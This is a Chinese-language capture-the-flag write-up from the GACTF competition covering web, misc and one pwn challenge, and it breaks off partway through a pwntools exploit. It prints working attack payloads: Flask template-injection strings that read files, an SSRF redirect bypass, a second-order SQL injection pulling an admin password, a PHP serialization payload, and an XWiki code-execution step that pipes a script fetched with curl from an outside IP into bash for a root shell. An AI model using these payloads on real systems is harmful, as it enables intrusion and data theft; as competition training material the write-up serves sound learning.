# 0RAYS-GACTF的writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
比赛很不错，又肝了两天，终于苟住第七名，师傅们太顶了
## WEB
###  EZFLASK
第一部分源码
    # -*- coding: utf-8 -*-    from flask import Flask, request
    import requests
    from waf import *
    import time
    app = Flask(__name__)
    @app.route('/ctfhint')
    def ctf():
        hint =xxxx # hints
        trick = xxxx # trick
        return trick
    @app.route('/')
    def index():
        # app.txt
    @app.route('/eval', methods=["POST"])
    def my_eval():
        # post eval
    @app.route(xxxxxx, methods=["POST"]) # Secret
    def admin():
        # admin requests
    if __name__ == '__main__':
        app.run(host='0.0.0.0',port=8080)
在eval界面可读取到下一步的地址/h4rdt0f1nd_9792uagcaca00qjaf  
payload:  
`eval=admin.func_globals`
里面是ssrf打内网，需要输入IP、端口和路径
IP和端口是127.0.1.1 8080 即是当前页面
爆破端口发现存在5000端口，这个可以获得flag
    ip=127.0.2.1&port=5000&path=/
第二部分源码
    import flask
    from xxxx import flag
    app = flask.Flask(__name__)
    app.config['FLAG'] = flag
    @app.route('/')
    def index():
        return open('app.txt').read()
    @app.route('/')
    def hack(hack):
        return flask.render_template_string(hack)
    if __name__ == '__main__':
        app.run(host='0.0.0.0',port=5000)
requsets支持302跳转，可以跳一下绕过前面的限制，就可以访问{{config}}拿flag了  
服务器上写个跳转到127.0.2.1：5000就行
###  simpleflask
一开始扫到了/console 需要PIN码 本来有一题就是靠文件读取算出PIN码的，所以就被带歪了
简简单单的绕过，Payload如下
    {{session.__init__.__globals__["__bui""ltins__")].open("/fl".__add__("ag")).read()}}
###  XWiki
网页下方可见版本11.10.1，存在CVE-2020-11057，可利用注册用户权限在个人控制台执行python代码，具体漏洞利用可参考下方资料
用现成payload试一下确认漏洞存在
    import os
    print(os.popen("id").read())
    print(os.popen("hostname").read())
执行ls发现有/readflag，尝试用base64带出，结果会使文件损坏  
在VPS上放一个文件，利用curl来Getshell
    import os
    print(os.popen("curl 47.114.179.29/bash.txt|bash").read())
有root权限的shell，但是直接远程readflag，网络情况令人捉急，直接cp一下readflag到一个可访问目录，然后下载过来
之后本地跑
    from pwn import *
    from Crypto.Util.number import *
    sh = process("./readflag")
    flag=""
    while True:
      try:
        sh.recvuntil("Which number is bigger?  ")
        number1 = sh.recvuntil(":")[:-1]
        number2 = sh.recvuntil("\n")[:-1]
        ans ='0' if int(number1)>int(number2) else '1'
        #print read[25:27],read[30:32],ans
        flag+=ans
        sh.sendline(ans)
    except Exception as e:
      print long_to_bytes(int(flag,2))
      exit()
###  babyshop
存在.git泄露，直接下载源码
但是被非预期了，后来题目才把这个修了
不知道说啥。。。。。。。。。。。
###  carefuleyes
文件名改名那里二次注入
    -1'union select 1,(select password from `user` where `privilege`='admin'),1,1,'1.jpg
跑出账号密码  
XM/qweqweqwe
    //poc.php
    <?php
    require 'common.php';
    $o = new XCTFGG('login',["XM","qweqweqwe"]);
    echo urlencode(serialize($o));
Payload:
    O%3A6%3A%22XCTFGG%22%3A2%3A%7Bs%3A14%3A%22%00XCTFGG%00method%22%3Bs%3A5%3A%22login%22%3Bs%3A12%3A%22%00XCTFGG%00args%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A%22XM%22%3Bi%3A1%3Bs%3A9%3A%22qweqweqwe%22%3B%7D%7D
## MISC
###  SignIN
打开画图快乐签到
## crymisc
docx其实是zip，修复头恢复得到图片
图片尾base64得到密码
修复base64密文后zip头得到另一个加密zip，根据密码解密得一堆emoji，猜测是emoji加密
🔭💙🐰✊🌻🐧💙😘🌻🍶💐🍌🏊🍩🚁🏊👹🐶😀🐶😀😘👹💙🍂💇😀😀😩🌻🍟👂🍶💐🍌🏊🍩👆🏠🙇🍂🍂👼😱🚔🐶👉✊😱🏠🙇🍂🍂👼😱🚊😧💨💙💕
网上有爆破脚本已得flag，emoji key为😭
`WelcometoGACTF!ThisisthepasswordGACTF{H4ppy_Mi5c_H4ppy_L1fe}`
###  v for Vendetta
由hint可知密码为6位数 爆破得密码是123233
解压后获得一个比较大的v文件，看头文件发现缺少gif头文件 修复后得到一个的gif图片（v.gif）
    # -*- coding: utf-8 -*-    from PIL import Image
    def find_box(im):
        cou = 0
        for j in range(540, 700):
            for k in range(0, 150):
                if im.getpixel((j, k)) == (0, 0, 0):
                    print((j, k))
                    return (j, 0, j + 1, 405)
    imagegif = Image.open(r'D:\Download\20200829GACTF\v\v.gif')
    tempimage = Image.new('RGB', (720, 405), '#000000')
    try:
        for i in range(0, 4000):
            imagegif.seek(i)
            tempimage.paste(imagegif, (0, 0))
            # 因为黑点位置好像没啥规律，就直接暴力搜吧
            find_box(tempimage)
    except:
        pass
有些行列没有找到问题也不大，把输出内容放文件里
    # -*- coding: utf-8 -*-    from PIL import Image
    tempimage = Image.new('RGB', (720, 405), '#FFFFFF')
    with open("黑点出现位置.txt") as f:
        try:
            while True:
                s=f.readline()
                x=int(s.split(",")[0])
                y=int(s.split(",")[1])
                tempimage.putpixel((x,y),(0,0,0))
        except:
            pass
    tempimage.show()
    tempimage.save("./465464.png")
附上一个一把梭直接出二维码图片的脚本
    from PIL import Image
    imgs = []
    for i in range(3583):
        p = Image.open('res/'+str(i)+'.png')
        p = p.crop((550,50,720,140))
        imgs.append(p)
    np = Image.new('L',(200,200),255)
    for tp in imgs:
        a,b = tp.size
        for y in range(b):
            for x in range(a):
                if tp.getpixel((x,y)) == (0,0,0,255):
                    np.putpixel((x,y),0)
    np.save('1.png')
QRsearch扫，居然能扫
    the password is V_f0r_VeNdettA_vk
    now,pwn me to get the flag.
    for China
    119.3.154.59  9999
    for foreign countries
    45.77.72.122 9999
解压文件nwp，结果文件全部是反过来的  
exp如下
    #!/usr/bin/python
    #-*- coding:UTF-8 -*-    from pwn import *
    import sys
    context.log_level = 'debug'
    context.terminal = ['tmux', 'split', '-h']
    context.binary = "./pwn"
    libc = ELF("./libc-2.27.so")
    if sys.argv[1] == "r":
     p = remote("119.3.154.59", 9999)
    elif sys.argv[1] == "l":
     p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./pwn"])
    else:
     p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "-g", "1234", "./pwn"])
     raw_input()
    elf = ELF("./pwn")
    p.recvuntil("3: exit\n")
    p.send("1\n")
    p.recvuntil("username:")
    p.send("a"*16)
    p.recvuntil("password:")
    p.send("a"*16)
    p.recvuntil("3: exit\n")
    p.send("2\n")
    p.recvuntil("username:")
    p.send("a"*16)
    p.recvuntil("password:")
    p.send("a"*16)
    p.recvuntil("4:logout\n")